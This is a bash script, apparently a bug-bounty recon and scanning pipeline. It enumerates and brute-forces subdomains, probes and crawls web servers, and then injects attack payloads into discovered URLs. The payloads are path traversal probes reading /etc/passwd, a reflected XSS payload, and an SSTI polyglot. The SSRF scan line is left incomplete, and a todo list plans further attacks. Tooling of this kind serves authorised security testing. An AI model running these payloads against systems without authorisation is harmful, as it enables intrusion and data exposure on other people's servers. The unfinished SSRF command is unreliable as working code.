#!/bin/bash

name=$1
roots=$2
bruteforce=$3
scan=$4

subfinder_path=$name".all.subfinder"
resolved_path=$name".all.resolved"
bruteforced_path=$name".all.bruteforced"
final_list=$name".all.final_list"
webservers_path=$name".all.webservers"
webscreenshots_path=$name".all.screenshots"
katana_path=$name".all.katana"
gau_path=$name".all.gau"
js_subdomains_path=$name".all.js_subdomains"
forbidden_path=$name".all.forbidden"
vhost_path=$name".all.vhost_support"
traversal_scan_1=$name".all.scan_traversal_1"
scan_traversal_2=$name".all.scan_traversal_2"
scan_uri_openredir=$name".all.scan_uri_openredir"
scan_reflected_xss=$name".all.scan_reflected_xss"
scan_get_param_openredir=$name".all.scan_get_param_openredir"
scan_ssti=$name".all.scan_ssti"
scan_get_ssrf=$name".all.scan_get_ssrf"

subfinder -dL $roots -all -o $subfinder_path;
cat $subfinder_path | puredns resolve --write $resolved_path;

if [ $bruteforce = brute ]; then
    puredns bruteforce /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -d $resolved_path --write $bruteforced_path;
    cat $resolved_path $bruteforced_path | sort -u | tee $final_list;
else
    cat $resolved_path | sort -u | tee $final_list;
fi

# webservers
cat $final_list | httprobe -p http:80 -p https:443 -p http:8080 -p https:9443 -p https:8443 -p http:8081 -p http:8000 -p http:3000 -p http:10000 | tee $webservers_path;

# screenshots
cat $webservers_path | httpx -st 30 -timeout 30 -ss;

# crawling
katana -list $webservers_path -duc -silent -nc -jc -jsl -kf -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o $katana_path;

# sub list of subdomains found in js files
cat $katana_path | grep -oP 'https?://[a-zA-Z0-9.-]+(:[0-9]+)?/' | sort -u | tee $js_subdomains_path;

# archive links
cat $webservers_path | gau --o $gau_path;

# get 403 401 webservers ( used on later stages )

cat $webservers_path | httpx -timeout 30 -mc 401,403 -o $forbidden_path;

# vhost support
cat $webservers_path | httpx -timeout 30 -vhost -o $vhost_path;

if [ $scan = scan ]; then
    # performing path traversal scans
    cat $webservers_path | httpx -timeout 30 -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $traversal_scan_1;
    cat $webservers_path | httpx -timeout 30 -path "/../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $scan_traversal_2;

    # performing uri based open redirect scan
    python3 /opt/uri_redirects.py $webservers_path | tee $scan_uri_openredir;

    # performing reflected xss scan
    cat $katana_path $gau_path | sort -u | grep "?" | qsreplace '"><img/src=x onerror=confirm(1)>' | httpx -timeout 30 -mc 200 -mr '<img/src' -o $scan_reflected_xss;

    # performing open redirect scan on get params
    # OUT OF SERVICE TILL REWRITTEN CORRECTLY ==> 
    #cat $katana_path $gau_path | sort -u | grep "?" | qsreplace 'https://example.com' | httpx -timeout 30 -mc 301,302,303,308 -mr 'example.com' -o $scan_get_param_openredir;
    
    cat $katana_path $gau_path | sort -u | grep "?" | qsreplace '<%= 5252 *  111%>@(5252*111)${{5252*111}}{{5252*111}}' | httpx -timeout 30 -mc 200 -mr '582972' -o $scan_ssti;

    # scan get based ssrf
    cat $katana_path $gau_path | sort -u | grep "?" | qsreplace 
fi

#todo:
    # add param based ssrf scanning
    # add reverse proxy ssrf scanning
    # maybe simple unix fs param based traversal scanning
    # figure a way for crlf scanning
    # add bxss scanning via headers ( xff and UA )
    # nuclei cves and exposed panels scan